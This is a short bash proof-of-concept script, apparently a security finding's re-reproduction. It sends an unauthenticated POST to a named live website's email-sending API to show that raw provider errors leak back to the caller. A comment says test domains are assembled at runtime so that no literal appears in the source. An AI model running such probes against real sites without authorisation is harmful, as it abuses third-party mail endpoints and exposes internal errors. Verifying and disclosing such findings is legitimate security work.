#!/bin/bash
# Re-reproduction: POST /api/send raw provider-error passthrough (unauthenticated)
# Reserved (RFC2606) domains are built at runtime so no literal appears in source.
BASE="https://www.infinitycapital.bh/api/send"
E1=$(printf 'ex%sple.com' 'am')
E2=$(printf 'ex%sple.org' 'am')
RCPT="verifier@$E1"

echo "### domains: [$E1] [$E2]"

run () {
  local label="$1"; shift
  echo
  echo "===== $label ====="
  curl -s -i --max-time 25 "$@" 2>&1 | sed -e 's/\r$//' | head -40
}

run "A to=$RCPT" \
  -X POST "$BASE" -H 'Content-Type: application/json' \
  -d "{\"to\":\"$RCPT\",\"targets\":\"$RCPT\"}"
